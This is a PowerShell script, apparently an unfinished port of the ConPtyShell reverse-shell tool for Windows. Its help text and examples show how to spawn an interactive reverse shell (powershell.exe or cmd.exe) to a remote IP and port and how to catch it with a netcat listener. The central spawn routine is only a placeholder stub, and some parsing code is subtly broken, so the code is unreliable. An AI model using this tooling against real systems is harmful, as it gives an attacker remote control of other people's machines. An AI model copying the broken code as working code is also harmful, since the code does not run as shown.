class ConPtyShellException : System.Exception {
    hidden [string]$error_string = "[-] ConPtyShellException: "

    ConPtyShellException() : base() { }

    ConPtyShellException([string]$message) : base($this.error_string + $message) { }
}


class ConPtyShell {
    <# Define the class. Try constructors, properties, or methods. #>
    
    static [string] SpawnConPtyShell([string] $remoteIp, [uint32] $remotePort, [uint32] $rows, [uint32] $cols, [string] $commandLine, [bool] $upgradeShell) {

        Write-Host "remoteIP: $remoteIp, remotePort: $remotePort, rows: $rows, cols: $cols, cmdLine $commandLine, upShell $upgradeShell"

        return "Hi mom!"
    }
}

class ConPtyShellMainClass {
    
    static [void] DisplayHelp() {
        $help = @"
ConPtyShell - Fully Interactive Reverse Shell for Windows
Author: splinter_code
License: MIT
Source: https://github.com/antonioCoco/ConPtyShell
   
ConPtyShell - Fully interactive reverse shell for Windows
Properly set the rows and cols values. You can retrieve it from
your terminal with the command "stty size".
You can avoid to set rows and cols values if you run your listener
with the following command:
    stty raw -echo; (stty size; cat) | nc -lvnp 3001
If you want to change the console size directly from powershell
you can paste the following commands:
    `$width=80
    `$height=24
    `$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size (`$width, `$height)
    `$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList (`$width, `$height)
Usage:
    ConPtyShell.ps1 -RemoteIp <ip> -RemotePort <port> [-Rows <rows>] [-Cols <cols>] [-CommandLine <command>]
Positional arguments:
    RemoteIp                The remote ip to connect
    RemotePort              The remote port to connect
    [Rows]                  Rows size for the console
                            Default: "24"
    [Cols]                  Cols size for the console
                            Default: "80"
    [CommandLine]           The commandline of the process that you are going to interact
                            Default: "powershell.exe"
                           
Examples:
    Spawn a reverse shell
        .\ConPtyShell.ps1 -RemoteIp 10.0.0.2 -RemotePort 3001
   
    Spawn a reverse shell with specific rows and cols size
        .\ConPtyShell.ps1 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
   
    Spawn a reverse shell (cmd.exe) with specific rows and cols size
        .\ConPtyShell.ps1 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
"@

        Write-Host $help
    }

    static [bool] HelpRequired([string] $param) {
        return ($param -eq "-h") -or ($param -eq "--help") -or ($param -eq "/?")
    }

    static [void] CheckArgs([string[]] $arguments) {
        if ($arguments.Length -lt 2) {
            throw [ConPtyShellException] "ConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help."
        }
    }

    static [string] CheckRemoteIpArg([string] $ipString) {
        try {
            [System.Net.IPAddress]::Parse($ipString)
        } catch {
            throw [ConPtyShellException] "ConPtyShell: Invalid remoteIp value $ipString"
        }

        return $ipString
    }

    static [uint32] CheckUint([string] $arg) {
        try {
            return [uint32]$arg
        } catch {
            throw [ConPtyShellException] "ConPtyShell: Invalid unsigned integer value $arg"
        }
    }

    static [uint32] ParseRows([string] $arguments) {
        [uint32] $rows = 24;
        if ($arguments.Length -gt 2) {
            $rows = CheckUint($arguments[2]);
        }
        return $rows;
    }

    static [uint32] ParseCols([string] $arguments) {
        [uint32] $cols = 80;
        if ($arguments.Length -gt 3) {
            $cols = CheckUint($arguments[3]);
        }
        return $cols;
    }

    static [string] ParseCommandLine([string[]] $arguments) {
        [string] $commandLine = "powershell.exe"

        if ($arguments.Length -gt 4) {
            $commandLine = $arguments[4]
        }
        return $commandLine
    }

    static [string] ConPtyShellMain([string[]] $args) {
       [string] $output = "" 

        if ($args.Length -eq 1 -and [ConPtyShellMainClass]::HelpRequired($args[0])) {
            [ConPtyShellMainClass]::DisplayHelp()
        } else {
            [string] $remoteIp = ""
            [int] $remotePort = 0
            [bool] $upgradeShell = $false

            try {
                [ConPtyShellMainClass]::CheckArgs($args)
                
                if (($args[0]).Contains("upgrade")) {
                    $upgradeShell = $true
                } else {
                    $remoteIp = [ConPtyShellMainClass]::CheckRemoteIpArg($args[0])
                    $remotePort = [ConPtyShellMainClass]::CheckUint($args[1])
                }

                [uint32] $rows = [ConPtyShellMainClass]::ParseRows($args)
                [uint32] $cols = [ConPtyShellMainClass]::ParseCols($args)
                [string] $commandLine = [ConPtyShellMainClass]::ParseCommandLine($args)

                $output = [ConPtyShell]::SpawnConPtyShell($remoteIp, $remotePort, $rows, $cols, $commandLine, $upgradeShell)
            } catch {
                Write-Host $_.Exception.ToString()
            }
        }

       return $output
    }
}

function Invoke-ConPtyShell
{   
    <#
        .SYNOPSIS
            ConPtyShell - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            Source: https://github.com/antonioCoco/ConPtyShell
        
        .DESCRIPTION
            ConPtyShell - Fully interactive reverse shell for Windows
            
            Properly set the rows and cols values. You can retrieve it from
            your terminal with the command "stty size".
            
            You can avoid to set rows and cols values if you run your listener
            with the following command:
                stty raw -echo; (stty size; cat) | nc -lvnp 3001
           
            If you want to change the console size directly from powershell
            you can paste the following commands:
                $width=80
                $height=24
                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
            
            
        .PARAMETER RemoteIp
            The remote ip to connect
        .PARAMETER RemotePort
            The remote port to connect
        .PARAMETER Rows
            Rows size for the console
            Default: "24"
        .PARAMETER Cols
            Cols size for the console
            Default: "80"
        .PARAMETER CommandLine
            The commandline of the process that you are going to interact
            Default: "powershell.exe"
            
        .EXAMPLE  
            PS>Invoke-ConPtyShell 10.0.0.2 3001
            
            Description
            -----------
            Spawn a reverse shell

        .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
            
            Description
            -----------
            Spawn a reverse shell with specific rows and cols size
            
         .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
            
            Description
            -----------
            Spawn a reverse shell (cmd.exe) with specific rows and cols size
            
        .EXAMPLE
            PS>Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
            
            Description
            -----------
            Upgrade your current shell with specific rows and cols size
            
    #>
    Param
    (
        [Parameter(Position = 0)]
        [String]
        $RemoteIp,
        
        [Parameter(Position = 1)]
        [String]
        $RemotePort,

        [Parameter()]
        [String]
        $Rows = "24",

        [Parameter()]
        [String]
        $Cols = "80",

        [Parameter()]
        [String]
        $CommandLine = "powershell.exe",
        
        [Parameter()]
        [Switch]
        $Upgrade
    )
    
    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
        $RemoteIp = "upgrade"
        $RemotePort = "shell"
    }
    else{
  
        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
            throw "RemoteIp missing parameter"
        }
        
        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
            throw "RemotePort missing parameter"
        }
    }
    $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
    Write-Output $output
}
